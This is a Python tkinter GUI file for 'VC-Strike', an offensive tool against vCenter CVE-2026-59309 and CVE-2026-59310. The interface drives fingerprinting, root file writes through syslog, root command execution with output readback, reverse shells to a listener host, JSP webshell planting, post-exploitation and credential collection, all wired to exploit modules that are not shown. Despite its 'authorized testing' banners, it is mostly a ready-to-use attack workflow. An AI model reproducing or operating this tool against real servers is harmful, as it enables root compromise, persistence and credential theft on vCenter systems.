"""VC-Strike GUI —— tkinter 深色简洁界面，与 CLI 功能等价。

页签：①目标与指纹 ②CVE-2026-59310 ③CVE-2026-59309 ④C2/反弹Shell
      ⑤后渗透 ⑥清理中心 ⑦检测与加固

线程约定：tkinter 非线程安全 —— 后台线程（run_bg 的 work）只做网络/计算
并通过 self.log()/self.root.after() 触碰 UI；所有 UI 写操作必须在主线程。
"""
import base64
import csv
import os
import queue
import re
import sys
import threading
import time

try:
    import tkinter as tk
    from tkinter import ttk, filedialog, messagebox
except ImportError:      # CI / 无显示环境
    tk = None

from . import __version__, logutil, store
from .util import gen_password, gen_user, rand_name, stealth_user
from .recon import probe_target
from .srp59309 import srp_bypass_bind
from .berldap import (connect_ldap, root_dse_probe, op_search, op_add,
                      op_modify, op_delete, collect_search,
                      parse_ldap_result, has_srp)
from .syslog59310 import (build_rfc5424, check_write, write_file, plant_cron,
                          rce_readback, drop_webshell, traversal_app,
                          traversal_host, plant_revshell)
from .postex import POSTEX_ACTIONS
from .data import DETECTION_TEXT
from .c2 import SessionManager

COLORS = {
    # 浅色专业主题（常规安全工具风格）：白底、高对比、原生控件
    "bg": "#ffffff", "panel": "#f2f4f8", "panel2": "#e9edf3",
    "input": "#ffffff", "fg": "#1f2430", "muted": "#5b6472",
    "accent": "#2563eb", "ok": "#0f8a3d", "warn": "#b45309",
    "err": "#c0392b", "term": "#10151c", "termfg": "#d8e2ee",
    "border": "#d9dee7", "logbg": "#fbfcfe",
}


class ToolApp:
    def __init__(self, root):
        self.root = root
        self.root.title("VC-Strike — vCenter CVE-2026-59309/59310 授权测试套件 v%s"
                        % __version__)
        # ---- DPI 自适应：检测系统缩放，窗口/行高/间距/换行宽度按系数缩放 ----
        self.dpi = self.root.winfo_fpixels("1i")          # 实测像素密度
        self.S = max(1.0, self.dpi / 96.0)                # 相对 96dpi 的系数
        sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
        w = min(int(1280 * self.S), sw - 60)
        h = min(int(880 * self.S), sh - 60)
        self.root.geometry("%dx%d+60+40" % (w, h))
        self.root.minsize(min(int(1080 * self.S), sw - 40),
                          min(int(700 * self.S), sh - 40))
        # ---- 字体锁定：全部 UI 统一单一字族，消除 中英/粗细 混排不一致 ----
        # Microsoft YaHei UI 同时覆盖拉丁与 CJK（中文 Windows 系统默认 UI 字体），
        # 不存在时回退 Segoe UI。Tk 的 8 个命名字体是所有未显式指定字体的
        # 控件（含 tk 原生控件/菜单/对话框）的最终来源，逐个锁死。
        import tkinter.font as tkfont
        fam = "Microsoft YaHei UI"
        try:
            if fam not in tkfont.families(root):
                fam = "Segoe UI"
        except Exception:
            pass
        self.font_family = fam
        self.root.option_add("*Font", (fam, 9))
        for _n in ("TkDefaultFont", "TkTextFont", "TkMenuFont", "TkHeadingFont",
                   "TkCaptionFont", "TkSmallCaptionFont", "TkIconFont",
                   "TkTooltipFont", "TkFixedFont"):
            try:
                tkfont.nametofont(_n).configure(family=fam)
            except Exception:
                pass
        # ---- 运行日志：全程记录到 exe/脚本同目录（供测试后回传做二次修复）----
        logutil.start("gui")
        import platform as _platform
        import socket as _socket
        logutil.write("i", "VC-Strike v%s | %s | DPI=%d (S=%.2f) | frozen=%s"
                      % (__version__, _platform.platform(),
                         int(self.dpi), self.S,
                         "exe" if getattr(sys, "frozen", False) else "source"))
        logutil.write("i", "主机: %s | 用户: %s"
                      % (_socket.gethostname(), os.getenv("USERNAME", "?")))
        self.logq = queue.Queue()
        self.actions = []            # 会话动作记录（清理中心数据源）
        self.srp_conns = {}          # host -> LDAPConn（已绕过）
        self.creds = {}              # 凭据收集
        self.stop_flag = threading.Event()
        self.c2m = SessionManager(log=self.log)
        self.c2m.on_new_session = self._on_new_session
        self.cur_sess = None
        self._build_style()
        self._build_ui()
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        # ---- 全局快捷键 ----
        for seq, fn in (("<F1>", lambda e: self._goto(0)),
                        ("<F2>", self._k_f2),
                        ("<F3>", self._k_f3),
                        ("<F4>", self._k_f4),
                        ("<F5>", lambda e: self._scan_all()),
                        ("<F6>", self._k_f6),
                        ("<F7>", self._k_f7),
                        ("<F9>", self._k_f9),
                        ("<Escape>", lambda e: self._cancel()),
                        ("<Control-l>", lambda e: self._log_clear()),
                        ("<Control-s>", lambda e: self._log_save())):
            self.root.bind(seq, fn)
        if sys.platform == "win32":
            try:
                import ctypes
                self.root.update_idletasks()
                hwnd = ctypes.windll.user32.GetParent(self.root.winfo_id())
                val = ctypes.c_uint(0xFFFFFF)   # 白色标题栏，匹配浅色主题
                ctypes.windll.dwmapi.DwmSetWindowAttribute(hwnd, 35,
                                                           ctypes.byref(val), 4)
            except Exception:
                pass
        self.root.after(120, self._poll_log)
        self.root.after(1000, self._poll_sessions)
        self.root.after(200, self._poll_term)
        # 固定初始分割位：日志区随窗口按 ~24% 保底（weight 只在拖动/缩放时生效）
        self.root.after(300, lambda: self.pw.sashpos(
            0, max(300, int(self.root.winfo_height() * 0.76))))
        self.log("[i] 就绪。本工具仅用于授权渗透测试 / 漏洞验证。", "i")
        self.log("[i] 推荐流程：①指纹 → ②/③利用 → ⑤后渗透 → ⑥清理。", "m")
        self.log("[i] 全程运行日志: %s（测试完成后可直接把该文件回传做二次修复）"
                 % logutil.path(), "m")

    # ---------------- 样式 ----------------
    def _build_style(self):
        st = ttk.Style(self.root)
        for t in ("vista", "winnative", "clam"):
            if t in st.theme_names():
                st.theme_use(t)
                break
        C = COLORS
        # 字体已整体锁定（见 __init__ 字体锁定段）：全部 UI 单一字族，
        # 粗细一致；Consolas 仅保留在 C2 交互终端（shell 需要等宽对齐）。
        base = (self.font_family, 9)
        st.configure(".", background=C["bg"], foreground=C["fg"], font=base)
        st.configure("TNotebook", background=C["bg"], borderwidth=0,
                     tabmargins=(int(12 * self.S), int(8 * self.S),
                                 int(12 * self.S), 0))
        st.configure("TNotebook.Tab", padding=(int(16 * self.S), int(8 * self.S)),
                     font=base)
        st.map("TNotebook.Tab",
               background=[("selected", C["bg"]), ("!selected", C["panel"])],
               foreground=[("selected", C["accent"]), ("!selected", C["fg"])])
        st.configure("TFrame", background=C["bg"])
        st.configure("TLabel", background=C["bg"], foreground=C["fg"])
        st.configure("Muted.TLabel", background=C["bg"], foreground=C["muted"])
        st.configure("H1.TLabel", background=C["bg"], foreground=C["fg"],
                     font=(self.font_family, 13, "bold"))
        st.configure("TLabelframe", background=C["bg"], bordercolor=C["border"],
                     relief="solid", borderwidth=1)
        st.configure("TLabelframe.Label", background=C["bg"], foreground=C["fg"],
                     font=(self.font_family, 9, "bold"), padding=(2, 0))
        st.configure("TButton", font=base, padding=(10, 4))
        st.configure("Acc.TButton", font=(self.font_family, 9, "bold"),
                     padding=(12, 4))
        st.configure("Danger.TButton", foreground=C["err"])
        st.configure("TEntry", font=base)
        st.configure("TCombobox", font=base)
        st.configure("Treeview", background=C["bg"], fieldbackground=C["bg"],
                     foreground=C["fg"], rowheight=int(26 * self.S), font=base)
        st.configure("Treeview.Heading", background=C["panel"], foreground=C["fg"],
                     relief="flat", font=(self.font_family, 9, "bold"))
        st.map("Treeview",
               background=[("selected", C["accent"])],
               foreground=[("selected", "#ffffff")])
        try:
            st.configure("Sash", sashthickness=8)
        except Exception:
            pass
        self.root.option_add("*TCombobox*Listbox.font", base)
        self.root.option_add("*TCombobox*Listbox.background", C["bg"])
        self.root.option_add("*TCombobox*Listbox.foreground", C["fg"])
        self.root.option_add("*TCombobox*Listbox.selectBackground", C["accent"])

    # ---------------- 骨架 ----------------
    def _build_ui(self):
        C = COLORS
        head = ttk.Frame(self.root, padding=(14, 8))
        head.pack(fill="x")
        ttk.Label(head, text="VC-Strike", style="H1.TLabel").pack(side="left")
        ttk.Label(head, text="  CVE-2026-59310 (syslog→root RCE) + "
                             "CVE-2026-59309 (SRP 认证绕过)",
                  style="Muted.TLabel").pack(side="left", padx=6)
        self.status_var = tk.StringVar(value="● 就绪")
        ttk.Label(head, textvariable=self.status_var,
                  style="Muted.TLabel").pack(side="right")
        ttk.Label(head, text="仅限授权测试 ·", style="Muted.TLabel").pack(side="right")

        # 中部用垂直 PanedWindow：Notebook 与日志面板按 5:1 分配空间且可拖拽，
        # 窗口变小时日志保底可见（此前 pack 顺序导致日志被挤到不可见）
        self.pw = ttk.Panedwindow(self.root, orient="vertical")
        self.pw.pack(fill="both", expand=True, padx=10, pady=(8, 8))
        body = ttk.Frame(self.pw)
        self.pw.add(body, weight=5)
        self.nb = ttk.Notebook(body)
        self.nb.pack(fill="both", expand=True)
        tabs = []
        for _ in range(9):
            tabs.append(ttk.Frame(self.nb))
        self.tab_target, self.tab_59310, self.tab_59309, self.tab_shell, \
            self.tab_postex, self.tab_clean, self.tab_detect, self.tab_chain, \
            self.tab_vops = tabs
        for w, name in zip(tabs, (" ① 目标与指纹 ", " ② CVE-2026-59310 利用 ",
                                  " ③ CVE-2026-59309 利用 ", " ④ C2 / 反弹 Shell ",
                                  " ⑤ 后渗透 ", " ⑥ 清理中心 ", " ⑦ 检测与加固 ",
                                  " ⑧ 一键打通 ", " ⑨ vSphere 管理 ")):
            self.nb.add(w, text=name)

        self.cur_target = tk.StringVar()
        self.http_proxy = tk.StringVar()

        self._build_tab_target()
        self._build_tab_59310()
        self._build_tab_59309()
        self._build_tab_shell()
        self._build_tab_postex()
        self._build_tab_clean()
        self._build_tab_detect()
        self._build_tab_chain()
        self._build_tab_vops()

        logf = ttk.Frame(self.pw)
        self.pw.add(logf, weight=1)
        bar = ttk.Frame(logf)
        bar.pack(fill="x")
        ttk.Label(bar, text="日志", style="Muted.TLabel").pack(side="left")
        ttk.Button(bar, text="清空", command=self._log_clear, width=8).pack(side="right")
        ttk.Button(bar, text="打开日志目录", width=12,
                   command=self._open_logdir).pack(side="right", padx=4)
        ttk.Button(bar, text="保存", command=self._log_save, width=8).pack(side="right", padx=4)
        self.log_txt = tk.Text(logf, height=6, bg=C["logbg"], fg=C["fg"],
                               insertbackground=C["fg"], relief="flat",
                               highlightthickness=1,
                               highlightbackground=C["border"],
                               highlightcolor=C["border"],
                               font=(self.font_family, 9), state="disabled",
                               wrap="none")
        self.log_txt.pack(fill="both", expand=True)
        for k, c in (("i", C["fg"]), ("m", C["muted"]), ("+", C["ok"]),
                     ("w", C["warn"]), ("!", C["err"]), ("d", "#5a9d5f")):
            self.log_txt.tag_configure(k, foreground=c)

    def _poll_log(self):
        try:
            while True:
                lvl, msg = self.logq.get_nowait()
                ts = time.strftime("%H:%M:%S")
                self.log_txt.configure(state="normal")
                self.log_txt.insert("end", "[%s] %s\n" % (ts, msg), lvl)
                self.log_txt.see("end")
                self.log_txt.configure(state="disabled")
        except queue.Empty:
            pass
        self.root.after(120, self._poll_log)

    _LEAD = re.compile(r"^\[[+!widm~]\]\s*")

    def log(self, msg, level="i"):
        # 日志文件里级别已有 [level] 标注，去掉消息自带的重复前缀
        logutil.write(level, self._LEAD.sub("", msg, count=1))
        self.logq.put((level, msg))

    def _log_clear(self):
        self.log_txt.configure(state="normal")
        self.log_txt.delete("1.0", "end")
        self.log_txt.configure(state="disabled")

    def _open_logdir(self):
        d = logutil.log_dir()
        try:
            os.startfile(d)            # Windows 资源管理器打开
        except Exception:
            self.log("[i] 日志目录: %s" % d, "m")

    def _log_save(self):
        f = filedialog.asksaveasfilename(
            defaultextension=".log",
            initialfile="vc-strike-%s.log" % time.strftime("%Y%m%d-%H%M%S"))
        if not f:
            return
        with open(f, "w", encoding="utf-8") as fp:
            fp.write(self.log_txt.get("1.0", "end"))
        self.log("[+] 日志已保存: %s" % f, "+")

    # ---------------- 公共 ----------------
    def _tree_resizable(self, tree):
        """让 Treeview 列宽可拖拽：悬停表头分隔线（光标变双箭头）按下
        左右拖动即可调整该列宽度；tkinter 原生不支持，此处补齐。"""
        state = {"col": None, "x": 0, "w": 0}

        def _press(e):
            try:
                if tree.identify_region(e.x, e.y) == "separator":
                    state["col"] = tree.identify_column(e.x)
                    state["x"] = e.x
                    state["w"] = tree.column(state["col"], "width")
                else:
                    state["col"] = None
            except Exception:
                state["col"] = None

        def _motion(e):
            try:
                over = tree.identify_region(e.x, e.y) == "separator"
            except Exception:
                over = False
            tree.configure(cursor="sb_h_double_arrow" if over else "")

        def _drag(e):
            if state["col"]:
                tree.column(state["col"],
                            width=max(30, state["w"] + (e.x - state["x"])))

        tree.bind("<ButtonPress-1>", _press)
        tree.bind("<B1-Motion>", _drag)
        tree.bind("<Motion>", _motion)

    def _target_bar(self, parent, row=0):
        f = ttk.Frame(parent)
        f.grid(row=row, column=0, columnspan=12, sticky="ew", pady=(0, 4))
        ttk.Label(f, text="目标:", style="Muted.TLabel").pack(side="left")
        ttk.Entry(f, textvariable=self.cur_target, width=26).pack(side="left", padx=4)
        return f, self.cur_target

    def _wrap_lbl(self, parent, text):
        """随面板宽度自动换行的说明标签（小窗口下不再右缘截断）。"""
        lbl = ttk.Label(parent, text=text, style="Muted.TLabel", justify="left")
        lbl.pack(anchor="w", padx=6, pady=2, fill="x")
        lbl.bind("<Configure>", lambda e, l=lbl: l.configure(
            wraplength=max(160, e.width - 16)))
        return lbl

    def _busy(self, text):
        self.root.after(0, self.status_var.set, "● " + text)

    def _idle(self):
        self.root.after(0, self.status_var.set, "● 就绪")

    _UI_VARS = (("http_proxy", "str"), ("v510_port", "str"),
                ("v510_proto", "str"), ("v510_vport", "str"),
                ("v510_lhost", "str"), ("v510_lport", "str"),
                ("v590_port", "str"), ("v590_ident", "str"),
                ("v590_cbase", "str"), ("vv_dest", "str"))

    def _load_ui_state(self):
        """启动恢复上次界面状态（目标清单/当前目标/端口/代理，不含密码）。"""
        try:
            st = store.load_ui()
        except Exception:
            return
        for var, _k in self._UI_VARS:
            v = st.get(var)
            if v is not None and hasattr(self, var):
                try:
                    getattr(self, var).set(v)
                except Exception:
                    pass
        for h in st.get("targets", []):
            try:
                self.scan_tree.insert("", "end",
                                      values=(h, "", "", "", "", "", "", "", "", "", "", ""))
            except Exception:
                pass
        cur = st.get("cur_target")
        if cur:
            self.cur_target.set(cur)
        proxy = st.get("http_proxy")
        if proxy:
            self.http_proxy.set(proxy)
        dest = st.get("vv_dest")
        if dest:
            self.vv_dest.set(dest)

    def _save_ui_state(self):
        try:
            targets = [self.scan_tree.item(i, "values")[0]
                       for i in self.scan_tree.get_children()]
            state = {"targets": targets,
                     "cur_target": self.cur_target.get(),
                     "vv_dest": self.vv_dest.get()}
            for var, _k in self._UI_VARS:
                if hasattr(self, var):
                    state[var] = getattr(self, var).get()
            store.save_ui(state)
        except Exception:
            pass

    def _on_close(self):
        self.stop_flag.set()
        try:
            self.c2m.shutdown()
        except Exception:
            pass
        logutil.finish()
        self.root.destroy()

    # ---- 快捷键 ----
    def _goto(self, idx):
        self.nb.select(idx)

    def _k_f2(self, _e):
        self.nb.select(self.tab_59310)
        self._b310_check()

    def _k_f3(self, _e):
        self.nb.select(self.tab_59309)
        self._b309_probe()

    def _k_f4(self, _e):
        self.nb.select(self.tab_shell)
        self._c2_add_listener_ui()

    def _k_f6(self, _e):
        self.nb.select(self.tab_clean)
        self._clean_gen()

    def _k_f7(self, _e):
        self.nb.select(self.tab_chain)
        self._chain_run()

    def run_bg(self, fn, name="任务"):
        if getattr(self, "_task_running", False):
            self.log("[!] 已有任务执行中（%s），请等待或按 Esc 取消" %
                     getattr(self, "_task_name", "?"), "!")
            return
        self._task_running = True
        self._task_name = name

        def wrap():
            self._busy(name + "执行中…")
            try:
                fn()
            except Exception as e:
                import traceback
                tb = traceback.format_exc()
                self.log("[!] %s 异常: %r" % (name, e), "!")
                logutil.write("!", "%s 完整堆栈:\n%s" % (name, tb))
                self.root.after(0, lambda: self.status_var.set(
                    "● 上次任务失败（详见日志）"))
            finally:
                self._task_running = False
                self._idle()
        threading.Thread(target=wrap, daemon=True).start()


    def _k_f9(self, _e):
        self.nb.select(self.tab_vops)
        self._vv_refresh()
    def _cancel(self):
        self.stop_flag.set()
        self.log("[!] 已请求取消，等待当前步骤结束…", "!")

    def record(self, typ, target, detail, cleanup):
        self.actions.append({"time": time.strftime("%m-%d %H:%M:%S"), "type": typ,
                             "target": target, "detail": detail, "cleanup": cleanup})
        if hasattr(self, "act_tree"):
            a = self.actions[-1]
            self.root.after(0, lambda: self.act_tree.insert(
                "", "end", values=(a["time"], a["type"], a["target"], a["detail"])))
        self.log("[记录] %s → %s（清理项已登记）" % (typ, detail), "d")

    # ================= Tab1 目标与指纹 =================
    def _build_tab_target(self):
        f = self.tab_target
        f.columnconfigure(0, weight=1)
        f.rowconfigure(1, weight=1)

        top = ttk.Frame(f)
        top.grid(row=0, column=0, sticky="ew", pady=4)
        ttk.Label(top, text="目标:").pack(side="left")
        self.tgt_input = tk.StringVar()
        _e_tgt = ttk.Entry(top, textvariable=self.tgt_input, width=20)
        _e_tgt.pack(side="left", padx=4)
        _e_tgt.bind("<Return>", lambda e: self._tgt_add())
        ttk.Button(top, text="添加", command=self._tgt_add).pack(side="left")
        ttk.Button(top, text="导入", command=self._tgt_import).pack(side="left", padx=2)
        ttk.Button(top, text="删除", command=self._tgt_del).pack(side="left")
        ttk.Button(top, text="设为当前", command=self._tgt_setcur).pack(side="left", padx=2)
        ttk.Button(top, text="批量指纹 [F5]", style="Acc.TButton",
                   command=self._scan_all).pack(side="left", padx=6)
        ttk.Button(top, text="导出 CSV", command=self._scan_export).pack(side="left")
        ttk.Label(top, text="代理(http://…,可选):", style="Muted.TLabel").pack(side="right", padx=(8, 2))
        ttk.Entry(top, textvariable=self.http_proxy, width=14).pack(side="right")

        cols = ("host", "443", "5480", "514", "1514", "389", "636", "2020",
                "api", "sasl", "nc", "conclusion")
        heads = ("主机", "443 Web", "5480 VAMI", "514 Syslog", "1514 TLS",
                 "389 LDAP", "636 LDAPS", "2020 vmdird", "API 版本",
                 "SASL 机制", "命名上下文", "结论")
        wrapf = ttk.Frame(f)
        wrapf.grid(row=1, column=0, sticky="nsew", pady=4)
        self.scan_tree = ttk.Treeview(wrapf, columns=cols, show="headings",
                                      selectmode="extended")
        widths = (130, 50, 58, 60, 50, 50, 54, 70, 68, 165, 175, 240)
        for c, hd, w in zip(cols, heads, widths):
            self.scan_tree.heading(c, text=hd)
            self.scan_tree.column(c, width=w, anchor="w")
        sy = ttk.Scrollbar(wrapf, orient="vertical", command=self.scan_tree.yview)
        sx = ttk.Scrollbar(wrapf, orient="horizontal", command=self.scan_tree.xview)
        self.scan_tree.pack(side="left", fill="both", expand=True)
        sy.pack(side="left", fill="y")
        sx.pack(side="bottom", fill="x")
        self.scan_tree.configure(yscrollcommand=sy.set, xscrollcommand=sx.set)
        self._tree_resizable(self.scan_tree)
        self.scan_tree.bind("<Button-3>", self._scan_menu)
        self.scan_tree.bind("<Double-1>", lambda e: self._tgt_setcur())
        self.scan_results = {}

        ttk.Label(f, text="批量指纹 = 仅探测，不利用。双击行 → 设为全局当前目标。"
                          "UDP/514 无法被动探测，59310 的确认请用 ② 页“非破坏写入验证”。",
                  style="Muted.TLabel").grid(row=2, column=0, sticky="w")

    def _tgt_add(self):
        h = self.tgt_input.get().strip()
        if not h:
            return
        existing = {self.scan_tree.item(i, "values")[0].split(":")[0]
                    for i in self.scan_tree.get_children()}
        added = 0
        for part in h.replace(";", ",").split(","):
            part = part.strip()
            if part and part.split(":")[0] not in existing:
                self.scan_tree.insert("", "end",
                                      values=(part, "", "", "", "", "", "", "", "", "", "", ""))
                added += 1
        self.tgt_input.set("")
        if added:
            self.log("[+] 已添加 %d 个目标" % added, "m")

    def _tgt_import(self):
        fn = filedialog.askopenfilename(filetypes=[("文本", "*.txt"), ("所有", "*.*")])
        if not fn:
            return
        with open(fn, encoding="utf-8", errors="replace") as fp:
            n = 0
            for line in fp:
                line = line.strip()
                if line and not line.startswith("#"):
                    self.tgt_input.set(line)
                    before = len(self.scan_tree.get_children())
                    self._tgt_add()
                    n += len(self.scan_tree.get_children()) - before
        self.log("[+] 目标列表已导入 %d 个" % n, "+")

    def _tgt_del(self):
        for s in self.scan_tree.selection():
            self.scan_tree.delete(s)

    def _tgt_setcur(self):
        sel = self.scan_tree.selection()
        if not sel:
            return
        host = self.scan_tree.item(sel[0], "values")[0].split(":")[0]
        self.cur_target.set(host)
        self.log("[+] 当前目标 → %s" % host, "+")

    def _scan_all(self):
        hosts = [self.scan_tree.item(i, "values")[0].split(":")[0]
                 for i in self.scan_tree.get_children()]
        if not hosts:
            messagebox.showinfo("提示", "先添加目标")
            return
        proxy = self.http_proxy.get().strip() or None

        def work():
            self.log("[*] 批量指纹开始：%d 个目标（仅探测）" % len(hosts), "i")
            self.stop_flag.clear()
            for idx, h in enumerate(hosts, 1):
                if self.stop_flag.is_set():
                    self.log("[!] 批量指纹已中止", "!")
                    return
                self.log("[*] (%d/%d) %s …" % (idx, len(hosts), h), "m")
                try:
                    r = probe_target(h, proxy=proxy, log=self.log)
                except Exception as e:
                    self.log("[!] %s 探测异常: %r" % (h, e), "!")
                    continue
                self.scan_results[h] = r
                vals = (r["host"], "●" if r["443"] else "", "●" if r["5480"] else "",
                        "●" if r["514tcp"] else "", "●" if r["1514"] else "",
                        "●" if r["389"] else "", "●" if r["636"] else "",
                        "●" if r["2020"] else "",
                        r["api"] or "", r["mechs"] or "", r["nc"] or "", r["conclusion"])

                def _upd(vals=vals, h=h):
                    for iid in self.scan_tree.get_children():
                        if self.scan_tree.item(iid, "values")[0].split(":")[0] == h:
                            self.scan_tree.item(iid, values=vals)
                            break
                self.root.after(0, _upd)
                self.log("[+] %s → %s" % (h, r["conclusion"]), "+")
            self.log("[*] 批量指纹完成", "+")
        self.run_bg(work, "批量指纹")

    def _scan_export(self):
        if not self.scan_results:
            messagebox.showinfo("提示", "无结果可导出")
            return
        f = filedialog.asksaveasfilename(
            defaultextension=".csv",
            initialfile="vc-fingerprint-%s.csv" % time.strftime("%Y%m%d-%H%M%S"))
        if not f:
            return
        cols = ("host", "443", "5480", "514tcp", "1514", "389", "636", "2020",
                "api", "mechs", "nc", "conclusion")
        with open(f, "w", newline="", encoding="utf-8-sig") as fp:
            w = csv.writer(fp)
            w.writerow(cols)
            for h, r in self.scan_results.items():
                w.writerow([h] + [("●" if r.get(c) else "") if isinstance(r.get(c), bool)
                                  else (r.get(c) or "") for c in cols[1:]])
        self.log("[+] 指纹结果已导出: %s" % f, "+")

    # ================= Tab2 CVE-2026-59310 =================
    def _build_tab_59310(self):
        f = self.tab_59310
        f.columnconfigure(0, weight=1)
        f.columnconfigure(1, weight=1)
        f.rowconfigure(1, weight=1)
        _bar, tv = self._target_bar(f)
        self.v59310_host = tv

        left = ttk.Frame(f)
        left.grid(row=1, column=0, sticky="nsew", padx=(0, 6))
        right = ttk.Frame(f)
        right.grid(row=1, column=1, sticky="nsew", padx=(6, 0))

        pf = ttk.LabelFrame(left, text="参数")
        pf.pack(fill="x", pady=4)
        self.v510_port = tk.StringVar(value="514")
        self.v510_proto = tk.StringVar(value="UDP")
        self.v510_name = tk.StringVar(value=rand_name())
        self.v510_vport = tk.StringVar(value="5480")
        self.v510_b64 = tk.BooleanVar(value=True)
        ttk.Label(pf, text="syslog端口:").grid(row=0, column=0, sticky="w", padx=4, pady=2)
        ttk.Entry(pf, textvariable=self.v510_port, width=7).grid(row=0, column=1)
        ttk.Label(pf, text="协议:").grid(row=0, column=2, padx=(10, 2))
        ttk.Combobox(pf, textvariable=self.v510_proto, values=["UDP", "TCP", "TLS"],
                     width=5, state="readonly").grid(row=0, column=3)
        ttk.Label(pf, text="标识:").grid(row=0, column=4, padx=(10, 2))
        ttk.Entry(pf, textvariable=self.v510_name, width=9).grid(row=0, column=5)
        ttk.Button(pf, text="↻", width=3,
                   command=lambda: self.v510_name.set(rand_name())).grid(row=0, column=6)
        ttk.Label(pf, text="VAMI端口(回显):", style="Muted.TLabel").grid(
            row=1, column=0, sticky="w", padx=4)
        ttk.Entry(pf, textvariable=self.v510_vport, width=7).grid(row=1, column=1)
        ttk.Checkbutton(pf, text="base64 封装命令(规避引号问题)",
                        variable=self.v510_b64).grid(row=1, column=2, columnspan=5,
                                                     sticky="w")

        bf = ttk.LabelFrame(left, text="探测 / 快速动作")
        bf.pack(fill="x", pady=4)
        ttk.Button(bf, text="非破坏写入验证（写 /tmp 标记）[F2]",
                   style="Acc.TButton",
                   command=self._b310_check).pack(fill="x", pady=2, padx=4)
        self._wrap_lbl(bf, "发送后需在目标上 ls 确认（UDP 无回包，写入验证即最强探测）。")
        ttk.Button(bf, text="一键取证（RCE：系统信息 + 机器账户 + SSO 域名）",
                   command=self._b310_quick_forensics).pack(fill="x", pady=2, padx=4)

        wf = ttk.LabelFrame(left, text="任意文件写 (root)")
        wf.pack(fill="both", expand=True, pady=4)
        ttk.Label(wf, text="目标路径(自动追加 -syslog.log):").grid(
            row=0, column=0, columnspan=2, sticky="w", padx=4)
        self.v510_wpath = tk.StringVar(value="/opt/vmware/share/htdocs/pwned")
        ttk.Entry(wf, textvariable=self.v510_wpath).grid(row=1, column=0, columnspan=2,
                                                         sticky="ew", padx=4)
        ttk.Label(wf, text="写入向量: APP-NAME（默认）或 HOSTNAME").grid(
            row=2, column=0, columnspan=2, sticky="w", padx=4)
        self.v510_vec = tk.StringVar(value="app")
        ttk.Combobox(wf, textvariable=self.v510_vec, values=["APP-NAME", "HOSTNAME"],
                     width=10, state="readonly").grid(row=3, column=0, sticky="w", padx=4)
        ttk.Label(wf, text="内容:", style="Muted.TLabel").grid(
            row=4, column=0, columnspan=2, sticky="w", padx=4)
        self.v510_wtext = tk.Text(wf, height=4, bg=COLORS["logbg"], fg=COLORS["fg"],
                                  insertbackground=COLORS["fg"], relief="flat",
                                  font=(self.font_family, 9))
        self.v510_wtext.grid(row=5, column=0, columnspan=2, sticky="ew", padx=4, pady=2)
        self.v510_wtext.insert("1.0", "pwned-by-authorized-test")
        ttk.Button(wf, text="预览报文", command=self._b310_preview).grid(
            row=6, column=0, sticky="w", padx=4, pady=2)
        ttk.Button(wf, text="发送写入", style="Acc.TButton",
                   command=self._b310_write).grid(row=6, column=1, sticky="e",
                                                  padx=4, pady=2)
        wf.columnconfigure(0, weight=1)

        rf = ttk.LabelFrame(right, text="RCE — root 命令执行")
        rf.pack(fill="x", pady=4)
        self.v510_cmd = tk.StringVar(value="id; hostname; cat /etc/vmware-release")
        ttk.Entry(rf, textvariable=self.v510_cmd).pack(fill="x", padx=4, pady=2)
        bb = ttk.Frame(rf)
        bb.pack(fill="x", padx=4, pady=2)
        ttk.Button(bb, text="执行并取回输出（VAMI）", style="Acc.TButton",
                   command=self._b310_rce_readback).pack(side="left")
        ttk.Button(bb, text="仅植入（输出到 /tmp）",
                   command=self._b310_rce_plain).pack(side="left", padx=6)
        ttk.Button(bb, text="取消 [Esc]", command=self._cancel).pack(side="left")
        self.v510_out = tk.Text(right, height=7, bg=COLORS["logbg"], fg=COLORS["fg"],
                                relief="flat", highlightthickness=1,
                                highlightbackground=COLORS["border"],
                                highlightcolor=COLORS["border"],
                                font=(self.font_family, 9))
        self.v510_out.pack(fill="both", expand=True, pady=4)
        self.v510_out.insert("1.0", "（RCE 输出将显示在此处 —— 执行「执行并取回输出」后回显）")

        sf = ttk.LabelFrame(right, text="反弹 Shell / C2")
        sf.pack(fill="x", pady=4)
        ttk.Label(sf, text="LHost:").grid(row=0, column=0, padx=4)
        self.v510_lhost = tk.StringVar()
        ttk.Entry(sf, textvariable=self.v510_lhost, width=15).grid(row=0, column=1)
        ttk.Label(sf, text="LPort:").grid(row=0, column=2, padx=(8, 2))
        self.v510_lport = tk.StringVar(value="4444")
        ttk.Entry(sf, textvariable=self.v510_lport, width=7).grid(row=0, column=3)
        ttk.Label(sf, text="方式:").grid(row=0, column=4, padx=(8, 2))
        self.v510_rmethod = tk.StringVar(value="bash")
        ttk.Combobox(sf, textvariable=self.v510_rmethod, values=["bash", "python"],
                     width=7, state="readonly").grid(row=0, column=5)
        ttk.Button(sf, text="植入 + 去 ④ 页监听", style="Acc.TButton",
                   command=self._b310_revshell).grid(row=1, column=0, columnspan=3,
                                                     sticky="w", padx=4, pady=4)

        jf = ttk.LabelFrame(right, text="JSP WebShell 植入（perfcharts statsreport）")
        jf.pack(fill="x", pady=4)
        jbar = ttk.Frame(jf)
        jbar.pack(fill="x", padx=4, pady=2)
        ttk.Label(jbar, text="名称:").pack(side="left")
        self.v510_wsname = tk.StringVar(value=rand_name())
        ttk.Entry(jbar, textvariable=self.v510_wsname, width=10).pack(side="left", padx=4)
        ttk.Button(jbar, text="↻", width=3,
                   command=lambda: self.v510_wsname.set(rand_name())).pack(side="left")
        ttk.Button(jbar, text="植入 WebShell", style="Acc.TButton",
                   command=self._b310_webshell).pack(side="left", padx=8)
        self._wrap_lbl(jf, "访问: https://<目标>/statsreport/<名称>.jsp?c=id"
                           "（&d= 可选指定工作目录；如需认证，配合 ③ 页账户或已提取凭据）")

    def _510_net(self):
        host = self.v59310_host.get().strip().split(":")[0]
        try:
            port = int(self.v510_port.get() or 514)
        except ValueError:
            messagebox.showwarning("提示", "syslog 端口需为数字")
            return None, 514, False, False
        proto = self.v510_proto.get()
        return host, port, proto in ("TCP", "TLS"), proto == "TLS"

    def _b310_check(self):
        host, port, tcp, tls = self._510_net()
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        name = self.v510_name.get().strip() or rand_name()

        def work():
            self.log("[*] CVE-2026-59310 非破坏验证 → %s:%d/%s" %
                     (host, port, self.v510_proto.get()), "i")
            path, pkt = check_write(host, port, name, tcp=tcp, tls=tls)
            self.log("[d] %r" % pkt, "d")
            self.log("[+] 已发送。预期目标生成 root 文件: %s" % path, "+")
            self.log("[i] 目标上验证: ls -la %s" % path, "m")
